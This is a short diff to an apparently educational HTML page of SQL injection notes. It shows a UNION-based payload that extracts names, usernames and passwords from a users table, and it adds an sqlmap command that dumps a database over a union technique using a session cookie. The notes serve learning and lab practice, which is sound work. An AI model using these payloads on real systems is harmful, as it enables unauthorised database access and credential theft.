@@ -34,3 +34,5 @@ Display all the columns fields in the information_schema user table<br>
 Display all the columns field contents in the information_schema user table<br>
 %' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #<br>
 </p>
+
+<code>sqlmap http://[IP]/admin?user=3 --cookie='token=[Enter Cookie] --technique=U --delay=2 -dump</code>
